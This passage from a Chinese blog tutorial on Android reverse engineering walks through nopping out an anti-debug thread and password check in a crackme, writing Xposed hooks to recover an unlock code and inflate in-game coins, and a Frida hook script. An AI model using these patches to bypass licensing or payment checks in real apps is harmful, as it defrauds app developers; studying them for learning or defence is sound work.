class="line">设置延迟的未捕获的java.lang.Throwable</span><br><span class="line">正在初始化jdb...</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/DDMS2.png" class="" title="显示绿色"><p>如果在DDMS中找不到相应进程，点一下重置adb，再选中目标进程，输入命令。</p><img src="/posts/15be101a/reset.jpg" class="" title="重置adb"><p>点击运行几次，直至弹窗。</p><img src="/posts/15be101a/10.6.png" class="" title="弹窗"><p>Ctrl + S 看到有执行权限的<code>libcrackme.so</code>文件，在Modulus窗口找到<code>libcrackme.so</code>中的<code>JNI_Oload</code>函数，在函数起始处下断，F9运行。</p><img src="/posts/15be101a/10.6.jpg" class="" title="下断运行"><p>然后F8步过，来到此位置。经多次调试，运行到<code>BLX R7</code>时会跳到另一段代码处。这段代码的用途是创建线程。</p><img src="/posts/15be101a/10.8.jpg" class="" title="创建线程"><p>为什么要在<code>JNI_Oload</code>里创建线程呢？很有可能是ptrace检测。<code>thread_create</code>函数在<code>init_array</code>段里，这个函数创建了一个线程循环来读取<code>/proc/pid/status</code>文件下的TracePid的值，如果大于0说明程序正在被调试，退出程序。直接nop掉这行代码试试。arm的<code>ANDEQ R0</code>对应x86的<code>nop</code>，机器码为<code>00 00</code>。</p><img src="/posts/15be101a/10.9.png" class="" title="nop掉创建线程"><p>保存，重打包，签名。现在用第9节的方法再试一遍，看是否能在<code>libcrackme.so</code>中的<code>securityCheck</code>方法中断下来。先下断点，再在app中输入密码，点击按钮，IDA成功停在断点处。</p><img src="/posts/15be101a/10.10.png" class="" title="停在断点处"><p>接下来如何破解？F8步过，运行到此处，查看R0寄存器，存的是输入的“555”。</p><img src="/posts/15be101a/10.11.png" class="" title="R0寄存器"><img src="/posts/15be101a/10.12.png" class="" title="代码分析"><p>如果要使输入任何都成功，则需要修改循环里的两个跳转语句。呃不知道为什么这里BNE的机器码不是<code>D1</code>，所以只能全都改为nop语句也是可以的。</p><img src="/posts/15be101a/10.13.png" class="" title="BNE"><img src="/posts/15be101a/10.14.png" class="" title="nop"><p>卸载模拟器中旧的app：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb uninstall com.yaotong.crackme</span><br></pre></td></tr></table></figure><p>安装新的，运行。无论输入什么都会跳转到成功页面。</p><img src="/posts/15be101a/10.15.png" class="" title="成功"><h1 id="11-编写Xposed模块"><a href="#11-编写Xposed模块" class="headerlink" title="11. 编写Xposed模块"></a>11. 编写Xposed模块</h1><p>Xpose是一款特殊的安卓应用，诞生于著名的XDA论坛，它的原理是替换安卓系统<code>/system/bin</code>目录下的app_process来控制zygote进程，使得app_pross在启动时会加载<code>XposedBridge.jar</code>，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。</p><p>优点：Xpose可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码，用好了Xposed可以对我们的逆向过程起到事半功倍的作用。</p><p>缺点：本身不能对so中的函数进行修改，需要结合其他框架。 </p><p>在模拟器上安装Xposed框架 <a href="https://blog.csdn.net/weixin_48140105/article/details/118359568">https://blog.csdn.net/weixin_48140105/article/details/118359568</a> </p><p>编写一个Xposed模块，也就是开发一个安卓app。和普通程序本质上是一样的，不一样的点在于：</p><ul><li>让EdXposed知道我们安装的这个程序是个Xposed模块。</li><li>模块里要包含有Xposed的API的jar包，以实现下一步的hook操作。</li><li>这个模块里面要有对目标程序进行hook操作的方法。</li><li>要让手机上的Xposed框架知道，我们编写的Xposed模块中，哪一个方法是实现hook操作的，也就是hook类的入口。</li></ul><p>先在AS中创建一个Empty Activity项目，在界面创建一个按钮，实现某种功能。</p><img src="/posts/15be101a/11.8.png" class="" title="增加按钮"><p>在<code>MainActivity.java</code>中编写实现按钮功能代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposemk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button mBtn;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        mBtn = (Button) findViewById(R.id.btn);</span><br><span class="line">        mBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, message(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">message</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;红红火火恍恍惚惚&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接好模拟器，安装app运行。</p><img src="/posts/15be101a/11.9.png" class="" title="正常运行"><p>现在通过编写一个Xposed模块修改按钮被点击后显示的弹框信息。</p><p>下载XposedBridgeAPI模块 <a href="https://github.com/924587628/XposedBridgeAPI">https://github.com/924587628/XposedBridgeAPI</a> ，将下载的API拖进libs文件夹。</p><img src="/posts/15be101a/11.2.png" class="" title="拖进libs文件夹"><p>右击jar包 -&gt; Add As Library -&gt; OK。</p><p>app -&gt; src -&gt; main -&gt; AndroidManifest.xml ，在<code>application</code>标签中加入Xpose配置信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedmodule&quot;</span><br><span class="line">        android:value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposeddescription&quot;</span><br><span class="line">        android:value=&quot;Easy example&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedminversion&quot;</span><br><span class="line">        android:value=&quot;89&quot; /&gt;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/11.3.png" class="" title="Xposed"><p>app -&gt; build.gradle，在dependencies段里修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    ...</span><br><span class="line">    compileOnly files(&#x27;libs\\XposedBridgeAPI-89.jar&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/11.4.png" class="" title="compileOnly"><p>在<code>MainActivity.java</code>同目录里新建一个<code>hook.java</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposemk;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.example.xposemk&quot;</span>))&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;hooking...&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.example.xposemk.MainActivity&quot;</span>);</span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;message&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> param.getResult();</span><br><span class="line">                    XposedBridge.log(obj.toString());</span><br><span class="line">                    param.setResult(<span class="string">&quot;biubiubiu&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>右击main，New -&gt; Folder -&gt; Assets Folder。main -&gt; assets 右键 -&gt; New -&gt; file ，新建<code>xposed_init</code>文件，将内容编辑为包名+类名。</p><img src="/posts/15be101a/11.6.png" class="" title="Xposed_init文件"><img src="/posts/15be101a/11.7.png" class="" title="包名+类名"><p>模拟器卸载原本的app，重新安装。打开Xposed Installer，在模块栏勾选对应进程。</p><img src="/posts/15be101a/11.11.png" class="" title="Xposed Installer勾选对应进程"><p>重启模拟器，运行app，发现显示的弹框信息已被修改。</p><img src="/posts/15be101a/11.10.png" class="" title="弹框信息已被修改"><h1 id="12-Xpose实战"><a href="#12-Xpose实战" class="headerlink" title="12. Xpose实战"></a>12. Xpose实战</h1><p>hook一个函数需要知道以下三点：<br>(1)方法的包名+类名<br>(2)方法名<br>(3)方法的参数类型 </p><img src="/posts/15be101a/12.1.png" class="" title="解锁失败"><p>用jeb打开apk，查看<code>MainActivity</code>反编译的源码。</p><img src="/posts/15be101a/12.2.png" class="" title="查看源码"><p>发现有好多a，这里应该是做了简单混淆。那就一个个来看吧。</p><img src="/posts/15be101a/12.3.png" class="" title="简单混淆"><p><code>com.hfdcxy.android.by.a</code>包中有一个类a，其中有一个方法a和一个属性a。<code>a.a.a</code>的作用是输出Log语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hfdcxy.android.by.a;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;<span class="comment">//类a</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> a;<span class="comment">//属性a</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        a.a = <span class="literal">false</span>;<span class="comment">//属性a一开始为false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(String arg1)</span> &#123;<span class="comment">//方法a</span></span><br><span class="line">        <span class="keyword">if</span>(a.a) &#123;<span class="comment">//如果属性a为true，输出Log</span></span><br><span class="line">            Log.i(<span class="string">&quot;Tiger_test&quot;</span>, arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.hfdcxy.android.by.test</code>包中有一个类a，其中有一个方法a。<code>test.a.a</code>的作用是MD5加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hfdcxy.android.by.test;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;<span class="comment">//类a</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">a</span><span class="params">(String arg6)</span> &#123;<span class="comment">//方法a</span></span><br><span class="line">        MessageDigest v2;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            v2 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            System.out.println(v0.toString());</span><br><span class="line">            v0.printStackTrace();</span><br><span class="line">            <span class="type">String</span> <span class="variable">v0_1</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> v0_1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] v3 = arg6.toCharArray();</span><br><span class="line">        <span class="type">byte</span>[] v4 = <span class="keyword">new</span> <span class="title class_">byte</span>[v3.length];</span><br><span class="line">        <span class="type">int</span> v0_2;</span><br><span class="line">        <span class="keyword">for</span>(v0_2 = <span class="number">0</span>; v0_2 &lt; v3.length; ++v0_2) &#123;</span><br><span class="line">            v4[v0_2] = ((<span class="type">byte</span>)v3[v0_2]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] v0_3 = v2.digest(v4);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">v2_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">while</span>(v1 &lt; v0_3.length) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">v3_1</span> <span class="operator">=</span> v0_3[v1] &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="keyword">if</span>(v3_1 &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                v2_1.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v2_1.append(Integer.toHexString(v3_1));</span><br><span class="line">            ++v1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v2_1.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为解锁成功与否的过程没用到<code>b.a</code>，暂时先不分析它。</p><p>重新看这条关键代码，它的意思是v0等于当前手机的<code>android_id</code>经过MD5加密后与固定字符串<code>hfdcxy1011</code>进行拼接后再进行一次MD5加密得到的值截取前6位。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> a.a(a.a(Settings$System.getString(<span class="built_in">this</span>.a.getContentResolver(), <span class="string">&quot;android_id&quot;</span>)) + <span class="string">&quot;hfdcxy1011&quot;</span>).substring(<span class="number">0</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>这里有三种方式可以把这个解锁码打印出来：</p><p>(1)我们知道<code>test.a.a</code>方法是最后一层加密，我们可以hook这个a方法把它的返回值打印出来，然后取其前6位为解锁码；</p><p>(2)因为整个apk只有一处对<code>substring</code>的调用，我们可以hook系统函数<code>substring</code>把函数返回值打印出来；</p><p>(3)通过分析知道<code>a.a.a</code>方法为log打印的方法，我们可以hook这个a方法的参数，把解锁码通过Log打印出来。</p><p>这里取第一种。</p><p>方法的包名+类名：com.hfdcxy.android.by.test.a<br>方法名：a<br>方法的参数类型：String</p><p>过滤下包名防止Xposed找不到包名对应的类报错，这里的包名是<code>manifest</code>标签下的包名<code>com.ss.android.ugc.aweme</code>。</p><img src="/posts/15be101a/12.4.png" class="" title="包名"><p>在第11节程序里面的hook类编写hook代码。就是模板，往里塞参数就行。</p><img src="/posts/15be101a/12.5.png" class="" title="hook代码"><p>连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行<code>解锁程序.apk</code>，随意输入解锁码，点击解锁。回到AS搜索Log。</p><img src="/posts/15be101a/12.6.png" class="" title="Logcat"><p>因为<code>test.a.a</code>共调用了两次，第一次<code>MD5(android_id)</code>，第二次<code>MD5(MD5(android_id)+hfdcxy1011)</code>，取最后一次的前6位才是解锁码116f58。</p><p>输入解锁码，进入充值页面。</p><img src="/posts/15be101a/12.7.png" class="" title="解锁成功"><p>点几下充值金币，再点开启宝箱，发现金币不足。回jeb继续分析代码。我们已经进入“解锁成功”的代码里去，看到里面调用了<code>DrawActivity</code>类。</p><img src="/posts/15be101a/12.8.png" class="" title="DrawActivity"><p>进去看看。</p><img src="/posts/15be101a/12.9.png" class="" title="DrawActivity"><p>也就是需要点击9999次才能开启宝箱，达咩！我们的思路是直接hook第一个按钮，修改<code>test.b.a</code>方法，使按一次就有10000金币。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hfdcxy.android.by.test;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences$Editor;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">b</span> &#123;<span class="comment">//类b</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(SharedPreferences arg5, TextView arg6, <span class="type">int</span> arg7)</span> &#123;<span class="comment">//方法a，arg7是点击一次增加的金币数</span></span><br><span class="line">        <span class="type">SharedPreferences$Editor</span> <span class="variable">v0</span> <span class="operator">=</span> arg5.edit();</span><br><span class="line">        v0.putInt(<span class="string">&quot;coin&quot;</span>, arg5.getInt(<span class="string">&quot;coin&quot;</span>, <span class="number">0</span>) + arg7);</span><br><span class="line">        v0.commit();</span><br><span class="line">        arg6.setText(String.valueOf(arg5.getInt(<span class="string">&quot;coin&quot;</span>, <span class="number">0</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法的包名+类名：com.hfdcxy.android.by.test.b<br>方法名：a<br>方法的参数类型：SharedPreferences、TextView、int</p><p>编写hook代码：</p><img src="/posts/15be101a/12.10.png" class="" title="hook代码"><p>同样操作走一次，开启宝箱。</p><img src="/posts/15be101a/12.12.png" class="" title="开启宝箱"><img src="/posts/15be101a/12.11.png" class="" title="开启宝箱"><p>我们可以尝试一下获取解锁码的第二第三种方法。</p><p>第二种：<code>substring</code>是一个Java系统内部的方法，百度搜一下它的构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">substring</span><span class="params">(<span class="type">int</span> beginIndex)</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">substring</span><span class="params">(<span class="type">int</span> beginIndex, <span class="type">int</span> endIndex)</span></span><br></pre></td></tr></table></figure><p>方法的包名+类名：java.lang.String<br>方法名：substring<br>方法的参数类型：int、int</p><p>编写Xpose代码：</p><img src="/posts/15be101a/12.14.png" class="" title="xpose代码"><img src="/posts/15be101a/12.13.png" class="" title="解锁码"><p>哈哈哈好像不止一个，但很容易知道哪个是解锁码，但是下面这样写是不行。</p><p>方法的包名+类名：com.hfdcxy.android.by.test.a.a<br>方法名：substring<br>方法的参数类型：int、int</p><p>第三种：通过<code>a.a.a</code>方法打印Log。因为v0是解锁码的前6位，刚好下一行就是Log输出v0的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> a.a(a.a(Settings$System.getString(<span class="built_in">this</span>.a.getContentResolver(), <span class="string">&quot;android_id&quot;</span>)) + <span class="string">&quot;hfdcxy1011&quot;</span>).substring(<span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">com.hfdcxy.android.by.a.a.a(<span class="string">&quot;解锁码&quot;</span> + v0);</span><br></pre></td></tr></table></figure><p>方法的包名+类名：com.hfdcxy.android.by.a.a<br>方法名：a<br>方法的参数类型：String</p><img src="/posts/15be101a/12.15.png" class="" title="解锁码"><h1 id="13-Xpose实战2"><a href="#13-Xpose实战2" class="headerlink" title="13. Xpose实战2"></a>13. Xpose实战2</h1><p>目标：hook修改极品美女找茬游戏中的金币余额为999。</p><p>运行apk，每次评论或分享都可以获得50金币。</p><img src="/posts/15be101a/13.1.png" class="" title="找茬求助界面"><p>AK查看apk，manifest标签的包名为com.jimmy.beauty.pick，application标签添加android_debugable=”true”。</p><p>jeb中在smali代码中搜索“金币”，发现它在SOSActivity中。</p><img src="/posts/15be101a/13.2.png" class="" title="100金币"><p>进入SOSActivity反编译成Java代码，在某个case中发现CommentActivity。</p><img src="/posts/15be101a/13.3.png" class="" title="SOSActivity"><p>继续进去CommentActivity看看。有个按钮事件，一个是“现在去给”评价，另一个是“以后再说”。修改的思路是将giveComment方法放到“以后再说”，再将giveComment方法里的前3行都去掉，因为那几行代码是构造支付链接。这些都是在AK中修改smali代码完成的。</p><img src="/posts/15be101a/13.4.png" class="" title="giveComment"><p>进去setMoney方法，一个参数为Context类型，一个参数为int类型。</p><img src="/posts/15be101a/13.5.png" class="" title="setMoney"><p>此时可以hook这个setMoney方法了。</p><img src="/posts/15be101a/13.6.png" class="" title="hook代码"><p>连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行程序，开一局游戏，求助 -&gt; 评论 -&gt; 以后再说，就可以获得999金币！</p><img src="/posts/15be101a/13.7.png" class="" title="hook代码"><h1 id="14-adb注意事项"><a href="#14-adb注意事项" class="headerlink" title="14. adb注意事项"></a>14. adb注意事项</h1><p>每次打开AS模拟器都会弹出如下图所示的错误：</p><img src="/posts/15be101a/14.1.png" class="" title="错误"><p>是因为5037端口被占用了。在cmd输入<code>netstat -ano|findstr &quot;5037&quot;</code>查看被哪个进程占用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;netstat -ano|findstr &quot;5037&quot;</span><br><span class="line">  TCP    [::1]:3425             [::1]:5037             SYN_SENT        18760</span><br></pre></td></tr></table></figure><p>输入<code>taskkill -f -pid 18760</code>杀死相应的进程。</p><h1 id="15-Native层hook"><a href="#15-Native层hook" class="headerlink" title="15. Native层hook"></a>15. Native层hook</h1><p>本来想安装Cydia Substrate的，结果这个软件很久没更新了，最高只支持安卓系统4.3的，模拟器和近几年的真机都安装不了，所以换了另一个框架Frida。</p><p><a href="https://www.52pojie.cn/thread-1128884-1-1.html">Frida超详细安装实战教程</a></p><h2 id="15-1-Frida-hook-java"><a href="#15-1-Frida-hook-java" class="headerlink" title="15.1 Frida hook java"></a>15.1 Frida hook java</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida  <span class="comment">#导入frida模块</span></span><br><span class="line"><span class="keyword">import</span> sys    <span class="comment">#导入sys模块</span></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;  #从此处开始定义用来Hook的javascript代码</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;  </span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;com.example.testfrida.MainActivity&#x27;); //获得MainActivity类</span></span><br><span class="line"><span class="string">        MainActivity.testFrida.implementation = function()&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            send(&#x27;Statr! Hook!&#x27;); //发送信息，用于回调python中的函数</span></span><br><span class="line"><span class="string">            return &#x27;Change String!&#x27; //劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message,data</span>): <span class="comment">#js中执行send函数后要回调的函数</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.example.testfrida&#x27;</span>) <span class="comment">#得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）</span></span><br><span class="line">script = process.create_script(jscode) <span class="comment">#创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,on_message) <span class="comment">#加载回调函数，也就是js中执行send函数规定要执行的python函数</span></span><br><span class="line">script.load() <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="15-2-Frida-hook-返回值为int类型"><a href="#15-2-Frida-hook-返回值为int类型" class="headerlink" title="15.2 Frida hook 返回值为int类型"></a>15.2 Frida hook 